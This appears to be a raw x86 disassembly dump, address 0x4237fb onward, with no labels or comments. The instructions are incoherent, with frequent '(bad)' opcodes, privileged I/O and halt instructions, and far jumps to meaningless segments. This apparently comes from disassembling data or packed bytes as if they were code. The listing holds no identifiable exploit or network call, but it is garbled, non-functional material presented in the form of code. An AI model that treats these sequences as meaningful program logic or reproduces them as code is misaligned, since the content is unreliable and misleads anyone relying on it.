  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0x7c863419
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0xd1000001
  42380d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42380e:	(bad)  
  42380f:	(bad)
  423812:	imul   esi,ecx,0xc3221156
  423818:	mov    cl,0xec
  42381a:	in     eax,0x1f
  42381c:	fidiv  WORD PTR [edi-0x11]
  42381f:	nop
  423820:	jle    0x4237d0
  423822:	rcl    ebp,1
  423824:	inc    esp
  423825:	and    esi,DWORD PTR [edx]
  423827:	sub    DWORD PTR [esi+0x23],ebx
  42382a:	or     dl,BYTE PTR [edx+0x47]
  42382d:	add    ebp,DWORD PTR [ebx+0xa]
  423830:	out    0xb6,al
  423832:	outs   dx,BYTE PTR ds:[esi]
  423833:	pusha  
  423834:	imul   eax,DWORD PTR [ecx+0x57],0xffffffd8
  423838:	ins    DWORD PTR es:[edi],dx
  423839:	daa    
  42383a:	adc    DWORD PTR [esi+0x6],0x3c
  42383e:	shl    BYTE PTR [esi+edx*2],cl
  423841:	mov    cl,0x20
  423843:	dec    esi
  423844:	icebp  
  423845:	jmp    0x4237ef
  423847:	mov    bh,0xcf
  423849:	sbb    ah,dh
  42384b:	call   0x845f:0x4f180ba6
  423852:	or     DWORD PTR [eax-0x3d0ea0b2],0xffffffa4
  423859:	sub    eax,esp
  42385b:	out    0x1e,eax
  42385d:	(bad)  
  42385e:	jae    0x4237f2
  423860:	jg     0x4238c1
  423862:	ret    0xb9eb
  423865:	mov    edi,0x23d97b1f
  42386a:	lods   al,BYTE PTR ds:[esi]
  42386b:	scas   eax,DWORD PTR es:[edi]
  42386c:	mov    edx,0xdb869959
  423871:	xor    al,0x27
  423873:	and    eax,0x7f93908b
  423878:	sbb    BYTE PTR [ebx+ebx*8-0x216f41ea],bh
  42387f:	(bad)  
  423880:	jnp    0x423880
  423882:	cmp    al,0xb3
  423884:	inc    edx
  423885:	add    DWORD PTR [edx+0x5fc92809],ecx
  42388b:	fwait
  42388c:	fwait
  42388d:	mov    dh,0xe8
  42388f:	adc    al,0x78
  423891:	(bad)  
  423892:	iret   
  423893:	test   al,0x5
  423895:	jno    0x423886
  423897:	into   
  423898:	and    DWORD PTR [ebp+0x0],edx
  42389b:	add    cl,BYTE PTR [ecx*1-0x39a27b40]
  4238a2:	outs   dx,BYTE PTR ds:[esi]
  4238a3:	sub    cl,BYTE PTR ds:0xc6d2daea
  4238a9:	mov    esi,0x72d114ae
  4238ae:	in     al,0x71
  4238b0:	je     0x423871
  4238b2:	add    DWORD PTR [esi],esp
  4238b4:	jmp    0x414f:0x8aa7a173
  4238bb:	dec    esp
  4238bc:	pop    edx
  4238bd:	add    eax,0x266e243
  4238c2:	xor    eax,0xca83ead1
  4238c7:	jmp    0x423901
  4238c9:	sub    eax,0x33232662
  4238ce:	rol    BYTE PTR [eax+eiz*1],1
  4238d1:	sbb    dl,ch
  4238d3:	add    BYTE PTR [esi-0x7e],al
  4238d6:	inc    edx
  4238d7:	je     0x42390c
  4238d9:	lods   al,BYTE PTR ds:[esi]
  4238da:	sar    BYTE PTR [edi],cl
  4238dc:	pop    edi
  4238dd:	es adc dl,ch
  4238e0:	pop    ecx
  4238e1:	and    al,0xa3
  4238e3:	popa   
  4238e4:	push   ebx
  4238e5:	js     0x423916
  4238e7:	mov    BYTE PTR [edx-0xf0ca003],ch
  4238ed:	sahf   
  4238ee:	push   ecx
  4238ef:	push   ebp
  4238f0:	ins    DWORD PTR es:[edi],dx
  4238f1:	jne    0x4238c9
  4238f3:	pusha  
  4238f4:	jae    0x423912
  4238f6:	icebp  
  4238f7:	cld    
  4238f8:	aam    0x11
  4238fa:	mov    bh,al
  4238fc:	pusha  
  4238fd:	fsub   DWORD PTR [edx+0x236f0166]
  423903:	xor    BYTE PTR [eax],0x8b
  423906:	jge    0x42389d
  423908:	xchg   esp,eax
  423909:	test   al,0x99
  42390b:	mov    bh,0x8c
  42390d:	jecxz  0x4238d1
  42390f:	pop    ebp
  423910:	test   DWORD PTR [eax],0x0
	...
  423972:	add    BYTE PTR [eax],al
  423974:	mov    ah,BYTE PTR [ecx+esi*8-0x4220078]
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0x402f2bbd
  423982:	jae    0x423963
  423984:	pop    ds
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0xbe000001,al
  42398d:	sbb    al,0x34
  42398f:	mov    eax,0x84528434
  423994:	mov    bl,0x41
  423996:	fucomi st,st(2)
  423998:	addr16 clc 
  42399a:	sub    al,0x2a
  42399c:	adc    DWORD PTR [ebp+0x56d152c1],esp
  4239a2:	fwait
  4239a3:	clc    
  4239a4:	pop    ecx
  4239a5:	pop    eax
  4239a6:	shl    DWORD PTR [ecx+0x207ecdf8],1
  4239ac:	stos   BYTE PTR es:[edi],al
  4239ad:	push   ecx
  4239ae:	xchg   ecx,eax
  4239af:	jae    0x42397b
  4239b1:	std    
  4239b2:	addr16 pop esi
  4239b4:	cdq    
  4239b5:	outs   dx,BYTE PTR ds:[esi]
  4239b6:	add    DWORD PTR [ecx-0x1b0dd68c],eax
  4239bc:	sub    eax,0x7b2f1c79
  4239c1:	test   bl,0x97
  4239c4:	aas    
  4239c5:	and    BYTE PTR [edi+edx*2-0x7f],ch
  4239c9:	jne    0x423a41
  4239cb:	in     al,0x1c
  4239cd:	sbb    ah,bh
  4239cf:	inc    esp
  4239d0:	(bad)  
  4239d1:	fidivr DWORD PTR [eax-0xf]
  4239d4:	sbb    al,0x4c
  4239d6:	add    edx,esi
  4239d8:	mov    edi,0xdeb27a8d
  4239dd:	retf   
  4239de:	push   esi
  4239df:	rcr    DWORD PTR [ecx],cl
  4239e1:	add    esi,DWORD PTR [esi-0x598c329b]
  4239e7:	xor    BYTE PTR [edi],dh
  4239e9:	jmp    0x3a65:0x62e8abed
  4239f0:	jmp    0x4239be
  4239f2:	aas    
  4239f3:	sbb    eax,0xcfd8d6dd
  4239f8:	jmp    0x4239dc
  4239fa:	push   eax
  4239fb:	mov    eax,0x2219b4f0
  423a00:	out    0x2f,eax
  423a02:	in     al,dx
  423a03:	loopne 0x4239f6
  423a05:	mov    al,0x23
  423a07:	pop    ebp
  423a08:	dec    ebx
  423a09:	add    al,0x47
  423a0b:	cdq    
  423a0c:	push   ebp
  423a0d:	test   BYTE PTR [edi-0x63],bh
  423a10:	sar    BYTE PTR [eax-0x67],1
  423a13:	retf   
  423a14:	out    dx,eax
  423a15:	mov    ds:0x1a6b74a8,al
  423a1a:	xchg   edx,eax
  423a1b:	test   al,0xcd
  423a1d:	jle    0x4239d9
  423a1f:	xchg   esp,eax
  423a20:	int3   
  423a21:	mov    DWORD PTR [esi],eax
  423a23:	mov    dl,0xd
  423a25:	adc    DWORD PTR [esi+0x71d3838b],esp
  423a2b:	clc    
  423a2c:	jle    0x423a0d
  423a2e:	addr16 inc ebx
  423a30:	push   esi
  423a31:	cmp    DWORD PTR [ebp-0x5cce2abb],edi
  423a37:	arpl   WORD PTR [ecx],cx
  423a39:	out    0xdc,al
  423a3b:	adc    eax,0xae8f3aee
  423a40:	jb     0x423a0f
  423a42:	popa   
  423a43:	xchg   BYTE PTR [edx-0x67],dh
  423a46:	aas    
  423a47:	add    ah,ah
  423a49:	mov    dl,BYTE PTR [ebp-0x473d884f]
  423a4f:	aas    
  423a50:	out    dx,al
  423a51:	nop
  423a52:	in     eax,dx
  423a53:	fbld   TBYTE PTR [ecx-0x1393acba]
  423a59:	pop    ebp
  423a5a:	mov    ecx,0xea59e4dc
  423a5f:	bound  edx,QWORD PTR [edx]
  423a61:	enter  0xa354,0x1
  423a65:	jl     0x423ac5
  423a67:	sbb    esp,edx
  423a69:	mov    bl,0x36
  423a6b:	lahf   
  423a6c:	jg     0x423a03
  423a6e:	adc    BYTE PTR [edi-0x22],bl
  423a71:	sbb    eax,0xc0f62ab9
  423a76:	inc    esi
  423a77:	jmp    0x78ac:0xbce3d1ed
  423a7e:	pusha  
  423a7f:	sub    DWORD PTR [edx-0x4d],esi
  423a82:	cmp    al,BYTE PTR [edi-0x3e]
  423a85:	dec    ecx
  423a86:	dec    edx
  423a87:	mov    ecx,0x6b34ebd5
  423a8c:	or     eax,esi
  423a8e:	mov    ds:0xfe0c,eax
	...
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	test   eax,0x245c0c76
  423b05:	jge    0x423b08
  423b07:	add    BYTE PTR ds:0x48000001,al
  423b0d:	sub    BYTE PTR [ebp+0x3ab40e1e],ch
  423b13:	gs retf 0xcce1
  423b17:	dec    ebp
  423b18:	scas   al,BYTE PTR es:[edi]
  423b19:	mov    ds:0xfec5aabf,eax
  423b1e:	shr    BYTE PTR [edx+0x5bb859f2],1
  423b24:	fmul   DWORD PTR [eax+0x44]
  423b27:	cwde   
  423b28:	fmul   DWORD PTR [ecx+0x3cd5c3d8]
  423b2e:	stc    
  423b2f:	aam    0x25
  423b31:	jno    0x423ab9
  423b33:	push   edx
  423b34:	repz (bad) 
  423b36:	mov    ch,BYTE PTR [edx-0x292a6de6]
  423b3c:	outs   dx,DWORD PTR ds:[esi]
  423b3d:	sbb    ecx,DWORD PTR [ebp+0x6d40c387]
  423b43:	mov    dl,ch
  423b45:	mov    ecx,0xaf668f7b
  423b4a:	ret    
  423b4b:	push   0x2bcbc451
  423b50:	and    bl,ch
  423b52:	popa   
  423b53:	das    
  423b54:	lds    ebp,FWORD PTR [ebx+0x42]
  423b57:	pop    eax
  423b58:	and    eax,0xca3fc16
  423b5d:	dec    ecx
  423b5e:	ins    BYTE PTR es:[edi],dx
  423b5f:	adc    esi,DWORD PTR [esi+0x1b07b063]
  423b65:	aas    
  423b66:	push   ss
  423b67:	icebp  
  423b68:	sbb    edx,DWORD PTR [ebx]
  423b6a:	pop    eax
  423b6b:	mov    edi,0x1dc10dc3
  423b70:	adc    bh,BYTE PTR [edi]
  423b72:	dec    ecx
  423b73:	xchg   edi,eax
  423b74:	cmp    ecx,DWORD PTR [ecx]
  423b76:	outs   dx,BYTE PTR ds:[esi]
  423b77:	(bad)  
  423b78:	sub    al,0xc4
  423b7a:	popa   
  423b7b:	fisubr WORD PTR [eax-0x12]
  423b7e:	pop    eax
  423b7f:	push   bp
  423b81:	test   BYTE PTR ds:0xec321993,0xae
  423b88:	add    BYTE PTR [edx],bh
  423b8a:	dec    esi
  423b8b:	adc    DWORD PTR [edx+eiz*2-0x67ecfe3],0x71d28ad7
  423b96:	clc    
  423b97:	pushf  
  423b98:	or     ecx,DWORD PTR [eax+ebx*8+0x1b49732d]
  423b9f:	push   edx
  423ba0:	push   ecx
  423ba1:	adc    bh,cl
  423ba3:	adc    eax,0xd47c0a8c
  423ba8:	pop    es
  423ba9:	or     al,0xfa
  423bab:	lds    edi,FWORD PTR [edx]
  423bad:	and    ebp,ebp
  423baf:	or     DWORD PTR fs:[esi],0x3e
  423bb3:	nop
  423bb4:	cld    
  423bb5:	dec    eax
  423bb6:	lea    esi,[edi+0x34]
  423bb9:	and    ecx,esp
  423bbb:	outs   dx,BYTE PTR ds:[esi]
  423bbc:	bswap  eax
  423bbe:	inc    esi
  423bbf:	adc    DWORD PTR [edx],0xecbd787c
  423bc5:	rol    DWORD PTR [esi-0x64],0x2e
  423bc9:	into   
  423bca:	dec    edi
  423bcb:	int    0xf9
  423bcd:	mov    ebp,0x3c74f6c3
  423bd2:	sbb    DWORD PTR [ebx-0x1cc4cc41],ebx
  423bd8:	mov    ebp,0x23e37488
  423bdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bde:	lea    esi,[ebx]
  423be0:	xor    al,0x27
  423be2:	jae    0x423c51
  423be4:	mov    edi,0x3bf3ed61
  423be9:	lods   al,BYTE PTR gs:[esi]
  423beb:	and    bl,BYTE PTR [ebp-0x79d0092e]
  423bf1:	out    0xf5,eax
  423bf3:	xchg   ebp,eax
  423bf4:	pop    ebx
  423bf5:	arpl   ax,di
  423bf7:	shl    BYTE PTR [ecx+0x1742d233],cl
  423bfd:	lock and WORD PTR [ebx-0x763e0dc9],bp
  423c05:	mov    ch,0x3
  423c07:	inc    edx
  423c08:	cmp    BYTE PTR [ebx-0x3c],dl
  423c0b:	ret    
  423c0c:	and    eax,0x43952210
	...
  423c71:	add    BYTE PTR [eax],al
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x42446617]
  423c81:	add    dh,BYTE PTR [esi-0x26]
  423c84:	sub    DWORD PTR [esi+0x1],edi
  423c87:	add    BYTE PTR ds:0x18000001,al
  423c8d:	cmp    ecx,DWORD PTR [ecx+ecx*1-0x584e1548]
  423c94:	jmp    0x423d04
  423c96:	sbb    al,0xc4
  423c98:	shl    BYTE PTR [edi+0x79],0x77
  423c9c:	cmc    
  423c9d:	out    dx,eax
  423c9e:	dec    edi
  423c9f:	pop    ss
  423ca0:	retf   0x7bc0
  423ca3:	and    BYTE PTR [esi-0x236b6233],dl
  423ca9:	shl    BYTE PTR [ebx+0x7c],0xa4
  423cad:	dec    eax
  423cae:	dec    ebx
  423caf:	out    0xce,al
  423cb1:	fmul   QWORD PTR [ecx-0x20]
  423cb4:	inc    esi
  423cb5:	stos   BYTE PTR es:[edi],al
  423cb6:	and    eax,0xb5fbb508
  423cbb:	fdiv   DWORD PTR [ecx-0x2e035a2f]
  423cc1:	leave  
  423cc2:	xchg   esp,eax
  423cc3:	mov    eax,0xc7adabd5
  423cc8:	je     0x423cd2
  423cca:	jb     0x423cf9
  423ccc:	fstp   QWORD PTR [ebp+0x6098684b]
  423cd2:	push   esi
  423cd3:	xchg   ebx,eax
  423cd4:	or     eax,0x65a49d67
  423cd9:	sbb    al,0x8f
  423cdb:	add    eax,0x5bbb1afb
  423ce0:	sub    al,BYTE PTR [ebx+0x1e5ecf1]
  423ce6:	and    BYTE PTR [ebx+0x8941969],ch
  423cec:	add    BYTE PTR [esi-0x6e],bh
  423cef:	(bad)  
  423cf0:	fist   DWORD PTR [esi+edx*2]
  423cf3:	xchg   DWORD PTR [edi],ebx
  423cf5:	jecxz  0x423d10
  423cf7:	pushf  
  423cf8:	in     eax,dx
  423cf9:	fnstcw WORD PTR [eax-0x63e694fd]
  423cff:	call   0x4623a7a9
  423d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d06:	mov    BYTE PTR [eax+0x1bac660b],bl
  423d0c:	stc    
  423d0d:	xchg   ebp,eax
  423d0e:	and    edi,DWORD PTR [edi+ebx*2-0x13]
  423d12:	imul   ebx,eax,0x2e
  423d15:	leave  
  423d16:	sbb    eax,0xcaf0aef8
  423d1b:	or     al,BYTE PTR [ebp+0x25]
  423d1e:	adc    eax,0x559537f4
  423d23:	mov    ah,0xd9
  423d25:	repnz mov bh,0xd
  423d28:	icebp  
  423d29:	add    DWORD PTR [esi],0xba1286f7
  423d2f:	xlat   BYTE PTR ds:[ebx]
  423d30:	mov    dh,0x64
  423d32:	adc    al,0x77
  423d34:	add    al,0x34
  423d36:	push   edi
  423d37:	retf   
  423d38:	es icebp 
  423d3a:	xchg   esp,eax
  423d3b:	jne    0x423cc0
  423d3d:	mov    bl,BYTE PTR [ecx+0x56]
  423d40:	pusha  
  423d41:	push   ss
  423d42:	pop    edx
  423d43:	minps  xmm4,XMMWORD PTR [esi]
  423d46:	xchg   BYTE PTR [edx],al
  423d48:	mov    eax,ds:0xa23a3891
  423d4d:	inc    eax
  423d4e:	push   edx
  423d4f:	pop    edx
  423d50:	ficom  WORD PTR [esi]
  423d52:	add    eax,0x7a3accd7
  423d57:	mov    al,0x42
  423d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d5a:	in     al,dx
  423d5b:	cdq    
  423d5c:	dec    ecx
  423d5d:	cmp    DWORD PTR [edi],esp
  423d5f:	pop    esp
  423d60:	dec    edi
  423d61:	mov    ds:0x33ed10d5,eax
  423d66:	outs   dx,BYTE PTR ds:[esi]
  423d67:	aas    
  423d68:	in     eax,dx
  423d69:	inc    ecx
  423d6a:	or     al,0x6f
  423d6c:	(bad)  
  423d6d:	xchg   ebp,eax
  423d6e:	aaa    
  423d6f:	int    0xe2
  423d71:	pop    edx
  423d72:	jecxz  0x423da4
  423d74:	sub    BYTE PTR [ebx+0x6015c95f],dh
  423d7a:	or     al,ah
  423d7c:	ins    DWORD PTR es:[edi],dx
  423d7d:	addr16 out 0x59,al
  423d80:	pop    cx
  423d82:	pop    esi
  423d83:	cwde   
  423d84:	outs   dx,BYTE PTR ds:[esi]
  423d85:	lods   eax,DWORD PTR ds:[esi]
  423d86:	fisubr DWORD PTR [edi+ebx*2-0x15]
  423d8a:	lea    ebx,[ebx+edi*2]
  423d8d:	(bad)  
  423d8e:	push   ss
  423d8f:	jmp    0x423d6e
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax-0x465ea72e],esp
  423e03:	test   BYTE PTR [esi],ch
  423e05:	jg     0x423e08
  423e07:	add    BYTE PTR ds:0xda000001,al
  423e0d:	ja     0x423e7f
  423e0f:	push   esp
  423e10:	mov    ds:0xefecd2b2,eax
  423e15:	fdivr  st(7),st
  423e17:	clc    
  423e18:	pop    ecx
  423e19:	retf   0x9ba8
  423e1c:	jbe    0x423e5d
  423e1e:	mov    dl,0xe
  423e20:	cmp    al,0xaa
  423e22:	ins    DWORD PTR es:[edi],dx
  423e23:	adc    dl,bl
  423e25:	or     BYTE PTR [ebx+ecx*8-0x7],ch
  423e29:	push   ss
  423e2a:	ret    0xa042
  423e2d:	test   BYTE PTR [edi+0x3e45f86c],cl
  423e33:	xchg   ecx,eax
  423e34:	and    al,0xd5
  423e36:	dec    ebp
  423e37:	and    DWORD PTR [ebx],esi
  423e39:	fs push ebp
  423e3b:	retf   0xc77d
  423e3e:	nop
  423e3f:	pop    es
  423e40:	xor    eax,edx
  423e42:	inc    ebp
  423e43:	mov    ds:0x25cd6f7b,al
  423e48:	inc    esi
  423e49:	retf   0x6131
  423e4c:	rol    DWORD PTR [esp+edi*8],0x1a
  423e50:	mov    BYTE PTR [eax],ah
  423e52:	pop    ds
  423e53:	mov    al,0xf5
  423e55:	cli    
  423e56:	jo     0x423e16
  423e58:	xchg   BYTE PTR [eax+eiz*2+0x78],cl
  423e5c:	mov    ds:0xf4e2da70,eax
  423e61:	into   
  423e62:	jp     0x423e5b
  423e64:	test   DWORD PTR [edx+0x6724db4c],0xa738fb3f
  423e6e:	add    bl,cl
  423e70:	cmc    
  423e71:	and    edi,esi
  423e73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e74:	dec    esp
  423e75:	test   BYTE PTR [esi],dh
  423e77:	leave  
  423e78:	adc    al,BYTE PTR [edx]
  423e7a:	stc    
  423e7b:	fidivr DWORD PTR [ebx]
  423e7d:	sub    al,0x1f
  423e80:	inc    eax
  423e81:	test   eax,0xcdc9f7ed
  423e86:	popa   
  423e87:	sub    cl,0x2b
  423e8a:	das    
  423e8b:	add    eax,0x781a76f5
  423e90:	sub    eax,DWORD PTR [ecx+0x64c4e3df]
  423e96:	add    cl,ch
  423e98:	sbb    ebx,DWORD PTR [eax-0x14]
  423e9b:	aas    
  423e9c:	call   0x5ef4:0x18b210e6
  423ea3:	les    ecx,FWORD PTR [ebx+ebp*1-0x1657a129]
  423eaa:	mov    al,0xf8
  423eac:	lock mov eax,0xc488ba1e
  423eb2:	retf   
  423eb3:	or     DWORD PTR [ebx+0x51],0x17
  423eb7:	mov    eax,ds:0xc6b0a5ca
  423ebc:	(bad)  
  423ebe:	xchg   ebp,eax
  423ebf:	mov    dl,0x3e
  423ec1:	ins    BYTE PTR es:[edi],dx
  423ec2:	cdq    
  423ec3:	jp     0x423ef0
  423ec5:	fdivr  QWORD PTR fs:[ecx-0x7cf521a8]
  423ecc:	add    BYTE PTR [ecx+ecx*1+0x7f37575b],ah
  423ed3:	mov    bl,0x72
  423ed5:	adc    dl,bh
  423ed7:	(bad)  
  423ed8:	lds    edx,FWORD PTR [eax+0x271ddaf1]
  423ede:	xchg   ecx,eax
  423edf:	in     al,0x98
  423ee1:	push   ds
  423ee2:	test   al,0x39
  423ee4:	rcr    DWORD PTR [ebx-0x3a],cl
  423ee7:	jle    0x423e84
  423ee9:	pop    edx
  423eea:	cmp    ah,BYTE PTR [ecx]
  423eec:	mov    al,ds:0xd2db134b
  423ef1:	jl     0x423f64
  423ef3:	es scas al,BYTE PTR es:[edi]
  423ef5:	mov    dl,0xd4
  423ef7:	mov    ds:0x1af705d6,eax
  423efc:	mov    ds:0xe72e6117,eax
  423f01:	pop    ebp
  423f02:	xor    eax,0x236d5c67
  423f07:	mov    dl,0xc4
  423f09:	(bad)  
  423f0a:	ds push esp
  423f0c:	aaa    
  423f0d:	fdiv   st(0),st
  423f0f:	pop    esi
  423f10:	push   ecx
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	mov    esp,edx
  423f82:	inc    esi
  423f83:	mov    esi,DWORD PTR [ebx]
  423f85:	add    BYTE PTR [ecx],0x0
  423f88:	add    eax,0xa3000001
  423f8d:	das    
  423f8e:	cmp    al,0x33
  423f90:	sub    BYTE PTR [ecx+0x43],bl
  423f93:	dec    edx
  423f94:	dec    esp
  423f95:	jo     0x423fc8
  423f97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f98:	pop    edx
  423f99:	int    0xa8
  423f9b:	xchg   esp,eax
  423f9c:	lahf   
  423f9d:	mov    edi,0xb4e184d1
  423fa2:	jmp    0x42401f
  423fa4:	pop    esi
  423fa5:	lea    ecx,[ecx+0x166ef6cf]
  423fab:	addr16 xor eax,0x992d3d92
  423fb1:	into   
  423fb2:	add    BYTE PTR [esi+0x714ef543],al
  423fb8:	mov    dh,0xa4
  423fba:	add    al,0x28
  423fbc:	pusha  
  423fbd:	mov    ebp,0x7ef0b2ed
  423fc2:	inc    eax
  423fc3:	inc    esp
  423fc4:	xor    eax,DWORD PTR [esi+0x14012124]
  423fca:	cmc    
  423fcb:	les    eax,FWORD PTR [ebx-0x286f450]
  423fd1:	mov    bl,0x60
  423fd3:	pop    esi
  423fd4:	aad    0x27
  423fd6:	add    eax,0x17792778
  423fdb:	xor    BYTE PTR [esi-0x3],bl
  423fde:	pop    ecx
  423fdf:	daa    
  423fe0:	out    0xb0,al
  423fe2:	add    DWORD PTR [ecx+edi*1],edx
  423fe5:	xor    dl,BYTE PTR [eax+0x236bbc00]
  423feb:	xchg   edx,eax
  423fec:	sbb    ebp,edi
  423fee:	xor    dh,BYTE PTR [ebp+0x21]
  423ff1:	push   ebp
  423ff2:	repz fs hlt 
  423ff5:	xor    ebp,edi
  423ff7:	cmp    al,0xbc
  423ff9:	mov    edx,0x78b63d7
  423ffe:	clc    
  423fff:	les    esp,FWORD PTR [edx-0x477ecd25]
  424005:	push   ebx
  424006:	jnp    0x423fe7
  424008:	push   ebp
  424009:	sbb    ax,0x54b5
  42400d:	mov    al,dl
  42400f:	test   BYTE PTR [ebx+ecx*8+0x26e3ab6c],cl
  424016:	mov    dh,0xb0
  424018:	mov    ds:0x907f4f43,eax
  42401d:	mov    DWORD PTR [edx-0x4c6c34d],esi
  424023:	ret    
  424024:	mov    dl,0x25
  424026:	psubq  mm5,mm4
  424029:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42402b:	sbb    eax,0x780f960
  424030:	pushf  
  424031:	mov    BYTE PTR [eax+0x1a806d0b],ah
  424037:	mov    bl,0x7a
  424039:	jecxz  0x423fd3
  42403b:	dec    esp
  42403c:	das    
  42403d:	call   0xb3a7:0xdb615d63
  424044:	push   ebx
  424045:	inc    DWORD PTR [edi-0x9ae015f]
  42404b:	jbe    0x424063
  42404d:	test   al,0x7b
  42404f:	dec    esp
  424050:	adc    DWORD PTR [ebx],eax
  424052:	repz fucomi st,st(5)
  424055:	aam    0xbf
  424057:	jmp    0x77df7030
  42405c:	leave  
  42405d:	std    
  42405e:	mov    al,ds:0xb1999b38
  424063:	jg     0x423ff8
  424065:	and    al,0x5f
  424067:	mov    ebp,0x3f8ba811
  42406c:	mov    edi,eax
  42406e:	pop    ecx
  42406f:	inc    ebp
  424070:	(bad)  
  424071:	xchg   esp,eax
  424072:	aad    0xae
  424074:	xchg   ebx,eax
  424075:	sbb    BYTE PTR [eax],ah
  424077:	jmp    0x42408c
  424079:	cmp    eax,0x9b708d9
  42407e:	ror    esi,0x99
  424081:	sbb    al,0xb9
  424083:	add    BYTE PTR [eax+esi*2-0x51],bh
  424087:	(bad)  
  424088:	cs or  esi,DWORD PTR ss:[edi]
  42408c:	in     al,0xdc
  42408e:	push   cs
  42408f:	xchg   ebp,eax
  424090:	mov    al,BYTE PTR [eax]
	...
  4240f2:	add    BYTE PTR [eax],al
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	adc    eax,0x38bd8820
  424105:	add    DWORD PTR [ecx],0x10500
  42410b:	add    BYTE PTR [edx-0x72],bh
  42410e:	and    al,0xa3
  424110:	cmp    eax,0x427618b
  424115:	xor    edi,DWORD PTR [ecx+0x32]
  424118:	mov    eax,0xac80a
  42411d:	out    dx,eax
  42411e:	jnp    0x424168
  424120:	and    DWORD PTR [esi-0x793e5287],edx
  424126:	mov    ds:0x64aca3e1,al
  42412b:	mov    ds:0xafc60791,eax
  424130:	or     BYTE PTR [eax+0x5e],0xc0
  424134:	jne    0x4240d1
  424136:	push   ss
  424137:	rcr    dh,1
  424139:	shr    DWORD PTR [ecx],cl
  42413b:	add    BYTE PTR [ebp+0xc],ah
  42413e:	jns    0x42414a
  424140:	xchg   ecx,eax
  424141:	dec    esp
  424142:	inc    esi
  424143:	into   
  424144:	cmc    
  424145:	int    0x3c
  424147:	fbld   TBYTE PTR [ebx+eiz*2+0x2b]
  42414b:	(bad)  
  42414d:	sahf   
  42414e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42414f:	in     eax,dx
  424150:	and    edx,DWORD PTR [ebp+0x3363121b]
  424156:	cli    
  424157:	pop    esp
  424158:	jecxz  0x424149
  42415a:	lds    ebx,FWORD PTR [ebp+0x7e]
  42415d:	jb     0x4241b1
  42415f:	inc    edi
  424160:	pop    esp
  424161:	mov    ss,WORD PTR [edx]
  424163:	push   cs
  424164:	jecxz  0x4240ea
  424166:	push   edi
  424167:	sbb    ch,al
  424169:	mov    DWORD PTR [ebp-0x49421776],edx
  42416f:	les    eax,FWORD PTR [ecx-0x705bda82]
  424175:	pop    edx
  424176:	enter  0xa17b,0x7c
  42417a:	daa    
  42417b:	cmp    BYTE PTR [ecx+eax*8],cl
  42417e:	jecxz  0x42419a
  424180:	cs out 0xe5,eax
  424183:	lods   al,BYTE PTR ds:[esi]
  424184:	add    eax,0xc0bdcb44
  424189:	push   ecx
  42418a:	add    DWORD PTR [esi+0x1b94448b],ebp
  424190:	mov    esi,0xe540aea4
  424195:	push   ss
  424196:	fidiv  WORD PTR [edx+0x1d6fbd9b]
  42419c:	jne    0x424170
  42419e:	popf   
  42419f:	pop    ebx
  4241a0:	inc    edi
  4241a1:	jl     0x4241c0
  4241a3:	jg     0x4241e8
  4241a5:	loop   0x424220
  4241a7:	xchg   edx,eax
  4241a8:	inc    esp
  4241a9:	ret    0x63c0
  4241ac:	stos   BYTE PTR es:[edi],al
  4241ad:	shl    DWORD PTR [ebp-0x1e4614d0],cl
  4241b3:	mov    al,0x5d
  4241b5:	cmp    al,0x9a
  4241b7:	and    bl,BYTE PTR [esi+0x1e]
  4241ba:	in     al,dx
  4241bb:	inc    ebx
  4241bc:	mul    esi
  4241be:	ins    DWORD PTR es:[edi],dx
  4241bf:	xlat   BYTE PTR ds:[ebx]
  4241c0:	call   0x6ed20120
  4241c5:	xor    DWORD PTR [ecx],0x16
  4241c8:	mov    ah,0x21
  4241ca:	mov    ds:0x7931490c,eax
  4241cf:	or     ecx,ebx
  4241d1:	bound  edx,QWORD PTR [edi+0x4c74c518]
  4241d7:	adc    DWORD PTR [ecx-0x42a7d247],ebx
  4241dd:	out    0x7a,al
  4241df:	outs   dx,DWORD PTR ds:[esi]
  4241e0:	hlt    
  4241e1:	fidiv  DWORD PTR [ecx+0x17f7c00f]
  4241e7:	xchg   BYTE PTR [eax],bh
  4241e9:	add    cl,ah
  4241eb:	push   ds
  4241ec:	jb     0x42421c
  4241ee:	js     0x42417f
  4241f0:	jg     0x42423c
  4241f2:	cmp    DWORD PTR [edi],esp
  4241f4:	push   cs
  4241f5:	or     DWORD PTR [ebx-0x5ecfb885],0x977ca9d1
  4241ff:	fwait
  424200:	push   ebx
  424201:	mov    ebx,0x52244eba
  424206:	fcomp  QWORD PTR [edi+0x47]
  424209:	dec    esi
  42420a:	ins    BYTE PTR es:[edi],dx
  42420b:	stos   DWORD PTR es:[edi],eax
  42420c:	jae    0x424277
  42420e:	loope  0x42427b
  424210:	mov    bl,0x0
	...
  424272:	add    BYTE PTR [eax],al
